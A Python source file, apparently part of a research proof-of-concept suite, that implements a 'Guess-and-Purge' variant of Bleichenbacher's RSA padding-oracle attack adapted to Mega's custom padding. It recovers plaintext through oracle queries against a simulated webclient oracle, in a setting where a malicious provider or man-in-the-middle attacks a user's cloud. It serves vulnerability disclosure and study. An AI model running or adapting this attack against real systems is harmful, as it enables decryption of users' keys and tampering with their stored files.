
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: Implementation fo the Guess-and-Purge variant of Bleichenbacher's
# Attack adapted for Mega's custom RSA Padding scheme.
#

import sys

from shared.attack_utils import *
from shared.mega_simulation import *
from shared.constants.mega_crypto import *
from issue_05.utils.smanager import *
from issue_05.utils.ciphertext import *

class MegaGaPBleichenbacher:
    """
    ###########
    # Setting #
    ###########

    A malicious cloud provider or TLS-MitM adversary aims to place a malicious
    file in the victim's cloud.

    ##########
    # Attack #
    ##########

    Perform our Guess-and-Purge variant of Bleichenbacher's attack using the
    oracle provided by Mega's webclient, which leaks whether the message has the
    following binary form:
        y || 0^8 || l || 0^4 || x
    where y are two bytes of unknown value, 0 <= l < 16 is a 4-bit value.

    The attack guesses prefix values y and performs an adapted version of
    Bleichenbacher's attack. Wrong guesses are quickly purged by subsequent
    iterations, because they lead to empty solution intervals.
    """

    def __init__(self, print_prefix):
        self.print_prefix = print_prefix

    def _bound2key(self, bound, shift, B):
        return ((bound % B) >> shift)

    def _is_possible_solution(self, bound, rand_bits, B):
        return self._bound2key(bound.a, rand_bits, B) \
            == self._bound2key(bound.b, rand_bits, B)

    def perform_gap_attack(self, ct, pt_len, pk):
        """
        Perform an adaption of Bleichenbachers attack to our oracle, which leaks whether the message has the
        following binary form:
            y || 0^8 || l 0^4 || x
        where y are two bytes of unknown value, 0 <= l < 16 is a 4-bit value (leading zeros)
        :param ct: target ciphertext
        :param pt_len: length of the plaintext (in bytes)
        :param pk: public key

        :return: recovered plaintext
        """

        # If n does not have power of two bits, adjust the prefix
        n, e = pk
        prefix_bits = PREFIX_MAX_BIT_LEN
        if n.bit_length() % PREFIX_MAX_BIT_LEN != 0:
            prefix_bits = n.bit_length() % PREFIX_MAX_BIT_LEN

        step_2a_call_cnt = 0
        step_2b_call_cnt = 0
        step_2c_call_cnt = 0

        # Valid messages are 16 * B <= pt < 128 * B (see encoding above)
        # The first two bytes are thrown away by the RSA decryption, the next two are used for the encoding.

        # Content = message || padding
        content_bit_len = n.bit_length() - prefix_bits - LEN_ENCODING_BIT_LEN

        # - prefix, - plaintext len encoding, -plaintext size
        rand_bits = content_bit_len - pt_len * 8

        # The length encoding is in bytes (divide by 8) and later shifted by 4 (multiples of 16)
        len_bits = (content_bit_len >> 7).bit_length()
        B = 1 << content_bit_len
        lower = 0
        upper = B << (RSA_ORACLE_MOD_BITS + len_bits + 1)
        print(f"{self.print_prefix}lower bound: {hex(lower)}")
        print(f"{self.print_prefix}upper bound: {hex(upper)}")

        #
        # Bleichenbacher's Step 1 (assuming we have a conforming ciphertext)
        #

        # sets of boundaries in which the plaintext message is contained (this is already a subset of all allowed messages)
        pt_min = 16 * B
        pt_max = pt_min + B - 1

        i = 1
        print(f"{self.print_prefix}Step 1: initializing.")
        # The lower bound for the s-value in step 2.a (with Bardou's optimization)
        s_min = ceil_int_div(n + pt_min, pt_max)
        smanager = SManager(s_min, B, lower, upper, n, ct)

        # A list of workloads. Each workloads is a tuple of the last s value and a list of bounds
        bounds_init = [Interval(pt_min, pt_max)]
        workloads = [(s_min, bounds_init)]
        possible_pts = []

        try:
            while len(workloads) > 0:
                print(f"{self.print_prefix} Iteration i = {i}")

                new_workloads = []
                for workload_idx, workload in enumerate(workloads):
                    s, bounds = workload
                    if len(bounds) == 0:
                        continue

                    #
                    # Bleichenbacher's Step 2
                    #

                    ## Step 2.a: starting the search
                    if i == 1:
                        step_2a_call_cnt += 1
                        s = smanager.find_next_s(s)
                        print(f"{self.print_prefix}Step 2.a (workload = {workload_idx}): "
                              f"found conforming message for s = {hex(s)}")
                    else:
                        ## Step 2.b: more than one interval left
                        if len(bounds) > 1:
                            step_2b_call_cnt += 1
                            s = smanager.find_next_s(s + 1)
                            print(f"{self.print_prefix}Step 2.b (workload = {workload_idx}): "
                                  f"found conforming message for s = {hex(s)}")
                        ## Step 2.c: only one interval left
                        else:
                            step_2c_call_cnt += 1
                            s = smanager.find_next_s_interval(s, bounds[0])
                            print(f"{self.print_prefix}Step 2.c (workload = {workload_idx}):"
                                  f" found conforming message for s = {hex(s)}")

                    #
                    # Step 3: Narrow the set of solutions
                    #

                    # For all workloads and all bounds
                    print(f"{self.print_prefix}Step 3: Start narrowing the set of solutions")
                    purged_workloads = 0
                    workloads_sep_idx = len(new_workloads)
                    for curr_workload_idx, curr_workload in enumerate(new_workloads + workloads[workload_idx:]):
                        curr_s, bounds = curr_workload
                        all_bounds = []

                        print(".", end="")
                        sys.stdout.flush()

                        for q in ct.possible_prefixes:
                            ## Add all new sets
                            new_bounds_q = []

                            y = (q * B) << 16

                            for bound in bounds:
                                a, b = bound.a, bound.b

                                # Always test at least on r value
                                r_min = ceil_int_div(a * s - upper + 1 - y, n)
                                r_max = max(r_min+1, floor_int_div(b * s - lower - y, n) + 1)
                                for r in range(r_min, r_max):
                                    new_a = max(a, ceil_int_div(lower + r * n + y, s))
                                    new_b = min(b, floor_int_div(upper - 1 + r * n + y, s))

                                    # Only add non-empty intervals
                                    if new_a <= new_b:
                                        new_bounds_q.append(Interval(new_a, new_b))

                            ## Do union over all bounds (sort after lower bound, then do one linear iteration -> O(n log(n)) for n bounds)
                            new_bounds_q_sorted = sorted(new_bounds_q, key=lambda x: x.a)
                            bounds_q = []
                            k = 0
                            while k < len(new_bounds_q_sorted):
                                a = new_bounds_q_sorted[k].a
                                j = k + 1
                                while True:
                                    if j >= len(new_bounds_q_sorted) or new_bounds_q_sorted[j-1].b < new_bounds_q_sorted[j].a:
                                        bounds_q.append(Interval(a, new_bounds_q_sorted[j-1].b))
                                        k = j
                                        break
                                    else:
                                        j += 1

                            next_bounds = []
                            if len(bounds_q) > 0:
                                for bound in bounds_q:
                                    if self._is_possible_solution(bound, rand_bits, B):
                                        possible_pts.append(self._bound2key(bound.a, rand_bits, B))
                                    else:
                                        next_bounds.append(bound)

                            # For the workload for which we searched s_i, we
                            # need to add new workloads
                            if curr_workload_idx == workloads_sep_idx and len(next_bounds) > 0:
                                new_workloads.append((s, next_bounds))
                            elif len(next_bounds) > 0:
                                all_bounds += next_bounds

                        # END q for loop

                        # One of the new workloads: update or delete
                        if curr_workload_idx < workloads_sep_idx:
                            updated_bounds = intersect_interval_lists(bounds, all_bounds)
                            new_workloads[curr_workload_idx] = (curr_s, updated_bounds)
                        # One of the unprocessed workloads: just update bounds
                        elif curr_workload_idx > workloads_sep_idx:
                            updated_bounds = intersect_interval_lists(bounds, all_bounds)
                            corrected_idx = curr_workload_idx - workloads_sep_idx + workload_idx
                            workloads[corrected_idx] = (curr_s, updated_bounds)
                            if len(updated_bounds) == 0:
                                purged_workloads += 1

                    # END inner workloads for loop

                    # Purge workloads with empty bounds
                    new_workloads_purged = []
                    for new_workload in new_workloads:
                        if len(new_workload[1]) > 0:
                            new_workloads_purged.append(new_workload)
                    new_workloads = new_workloads_purged

                # END outer workloads for loop
                print()
                workloads = new_workloads

                #
                # Step 4: returning the solution
                #

                # Check if the message bytes are already stable
                if len(workloads) == 0 and len(possible_pts) > 0:
                    print(f"{self.print_prefix}Step 4: done recovering plaintext, it's one of the following:\n{possible_pts}.")

                    print(f"{self.print_prefix}Stats:"
                          f"\n\t- Step 2a: {step_2a_call_cnt}"
                          f"\n\t- Step 2b: {step_2b_call_cnt}"
                          f"\n\t- Step 2c: {step_2c_call_cnt}"
                          f"\n\t- Oracle queries: {smanager.ct.oracle_query_cnt}")

                    return possible_pts
                else:
                    print(f"{self.print_prefix}Step 4: ", end="")
                    if len(workloads) > 1:
                        print(f"still {len(workloads)} workloads left")
                    elif len(workloads) == 1:
                        _, bounds = workloads[0]

                        if len(bounds) > 1:
                            print(f"still {len(bounds)} bounds left in the remaining workload")
                        else:
                            print(f"still one interval of cardinality {bounds[0].b - bounds[0].a} left")
                    i += 1

        except QueryThresholdException:
            print(f"{self.print_prefix}Aborting attack: query threshold of "
                  f"{smanager.ct.max_query_thr} queries reached. This seems to"
                   " be an expensive outlier, try re-running the attack.")
            return []

        print(f"{self.print_prefix}Unexpected error, no solutions left?")
        return []
